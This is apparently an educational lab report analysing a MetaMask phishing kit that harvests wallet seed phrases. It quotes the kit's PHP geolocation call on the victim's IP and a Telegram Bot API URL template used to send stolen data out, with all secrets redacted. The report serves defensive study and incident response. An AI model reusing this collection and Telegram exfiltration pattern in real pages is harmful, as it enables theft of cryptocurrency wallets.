Executive Summary

The phishing kit analyzed in this investigation targeted MetaMask users. The kit presented a fake wallet connection interface and attempted to collect wallet seed phrases from victims.

The main phishing logic was contained in a PHP file named metamask.php. This file collected submitted seed phrase data, gathered victim information such as IP address and user agent, used Sypex Geo to retrieve geolocation information, stored captured seed phrases locally in a log file, and sent collected information to a Telegram chat using the Telegram Bot API.

At the time of analysis, the local log file contained three collected seed phrase entries. These entries were redacted before being included in this report.


Scope

The purpose of this investigation was to analyze the phishing kit and identify how it operated.

The investigation focused on:

Identifying the targeted wallet
Locating the phishing kit source file
Determining the programming language used
Reviewing how victim information was collected
Identifying where stolen data was stored
Identifying the exfiltration method
Extracting relevant indicators and configuration artifacts
Documenting findings with supporting evidence


Methodology

The following steps were performed during the investigation:

Reviewed the directory structure of the phishing kit.
Inspected the wallet connection page.
Located the PHP file responsible for handling submitted data.
Reviewed the PHP source code for collection and exfiltration logic.
Examined the local log file containing captured seed phrase entries.
Identified external services used by the kit.
Documented indicators of compromise and relevant artifacts.
Redacted sensitive values before preparing the final report.


Findings
Targeted Wallet

The phishing page presents multiple cryptocurrency wallet options to the user. The kit is configured to request the seed phrase for the MetaMask wallet.

The wallet connection page displays MetaMask as one of the available wallet options. The PHP source code also labels the collected wallet type as MetaMask.


Evidence:
screenshots/walletdirectory.png


Phishing Kit Source File

The main phishing logic is contained in the following file:

metamask.php

This file contains the PHP code responsible for processing submitted seed phrase data and sending the collected information to the attacker-controlled destination.

The metamask directory contains a file named metamask.php, which includes the collection and exfiltration logic.

Evidence:
screenshots/metamaskphp.png


Programming Language

The phishing kit is written in PHP.

The source file uses the .php extension and contains PHP syntax, including variables, server-side request handling, API requests, and file operations.

Evidence:
screenshots/phpcontents.png


Victim Information Collection

The kit collects victim information by retrieving the victim's IP address and querying an external geolocation service.

The service used is:

Sypex Geo

The PHP code sends the victim’s remote IP address to the Sypex Geo API in order to retrieve geographic information such as country and city.

Relevant code behavior:

file_get_contents("http://api.sypexgeo.net/json/" . $_SERVER['REMOTE_ADDR']);

This allows the phishing kit to include victim location information in the collected data.

Evidence:
screenshots/phpcontents.png


Data Collection and Local Storage

The kit stores captured seed phrase submissions in a local log file.

The log file identified was:

log.txt

At the time of analysis, the log file contained three collected seed phrase entries.

The log directory contains the log.txt file. The file contents showed multiple captured seed phrase entries, with the most recent entry appearing at the bottom of the file.

All seed phrases were redacted before being included in the report.

Evidence:
screenshots/logtxt.png


Most Recent Captured Seed Phrase

The most recent phishing incident was identified by reviewing the latest entry in the local log file.

The seed phrase itself has been redacted for safety. The most recent entry appeared at the bottom of log.txt.

Evidence:
screenshots/logtxt.png


Data Exfiltration Method

The phishing kit exfiltrates collected data through Telegram.

The PHP source code builds a Telegram Bot API request and sends the collected victim data to a Telegram chat controlled by the attacker.

The Telegram API endpoint follows this structure:

https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=<MESSAGE>

The bot token and chat ID were present in the source code but have been redacted.

Evidence:
screenshots/phpcontents.png


Telegram Configuration

The phishing kit contains Telegram configuration values used for exfiltration.

The following values were identified:

Bot Token: [REDACTED]
Chat ID: [REDACTED]

These values allow the phishing kit to send stolen information to a Telegram channel or chat.

The Telegram bot token and chat ID were hardcoded inside the PHP source code.

Evidence:
screenshots/phpcontents.png


Developer Note / Actor Identifier

A comment inside the PHP source code contains a short message from the kit developer and an alias or identifier.

The identifier has been redacted in the public version of this report.

The PHP source file includes a developer comment block containing a message and signature.

Evidence:
screenshots/phpcontents.png


Impact

The phishing kit is designed to steal cryptocurrency wallet recovery seed phrases. If a victim submits their seed phrase, the attacker could potentially gain full access to the victim’s wallet and associated funds.

The kit also collects victim metadata, including IP address, geolocation information, and user agent data. This information may help the attacker track victims or organize stolen submissions.

Because wallet seed phrases provide full access to cryptocurrency wallets, successful phishing through this kit could result in complete wallet compromise.


Conclusion

The analyzed phishing kit is a MetaMask-themed credential theft tool written in PHP. It presents a fake wallet connection interface, collects seed phrase submissions, stores the captured data locally, and sends stolen information to an attacker-controlled Telegram chat.

The kit uses Sypex Geo to gather victim geolocation information and includes hardcoded Telegram configuration values for exfiltration. Three seed phrase entries were already present in the local log file at the time of analysis.

All sensitive data has been redacted from this report before publication.


Recommendations

If this phishing kit were discovered in a real environment, the following actions would be recommended:

1. Take the phishing page offline immediately.
2. Preserve a forensic copy of the phishing kit files.
3. Review web server logs for victim access and submission activity.
4. Identify and notify affected users if possible.
5. Report the Telegram bot token and chat ID to Telegram.
6. Block known malicious domains, IPs, and endpoints.
7. Rotate any exposed credentials or secrets.
8. Educate users on never entering wallet seed phrases into untrusted websites.
9. Monitor for similar phishing infrastructure or reused kit artifacts.


Disclaimer

This project was completed as part of a cybersecurity lab for educational purposes.

The repository does not include active phishing infrastructure, usable credentials, unredacted seed phrases, Telegram bot tokens, or chat IDs. All sensitive values have been redacted.

This report is intended to demonstrate investigation methodology, evidence collection, and security analysis skills.
